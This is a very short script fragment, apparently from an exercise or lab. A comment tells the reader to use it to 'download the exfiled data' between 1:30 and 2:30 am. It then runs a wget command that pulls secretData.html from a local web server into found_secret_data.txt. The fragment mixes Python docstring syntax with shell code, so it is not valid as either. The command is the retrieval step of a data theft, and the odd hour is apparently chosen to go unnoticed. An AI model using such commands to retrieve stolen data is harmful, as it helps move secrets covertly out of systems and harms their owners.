"""
Use this to download the exfiled data
Download between 1:30 and 2:30 am
"""

data="found_secret_data.txt"
wget -O $data http://127.0.0.1:8080/secretData.html
